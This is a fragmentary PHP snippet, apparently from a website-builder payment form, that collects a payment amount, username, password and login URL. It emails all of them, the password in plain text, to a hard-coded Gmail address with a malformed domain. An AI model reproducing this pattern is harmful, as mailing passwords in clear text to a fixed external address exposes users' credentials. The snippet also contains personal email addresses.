...
$password = "";
$url = "";
$to = "universekannan@gmail.com.com";
...
if(empty($payed) || empty($project_email) || empty($password) || empty($url))
	{
  ...
  <strong>Error!</strong> Please fill required fields
	...
	if(empty($status))
	{
		 ...
		 $subject = "SDA Builder Pament";
         $message  = "\n Last Amou: ".$payed."\r\n";
         $message .= "\n User Name: ".$project_email."\r\n";
		 $message .= "\n Password: ".$password."\r\n";
		 $message .= "\n Login Url: ".$url."\r\n";

         $header = "From:lalconstruction@gmail.com \r\n";
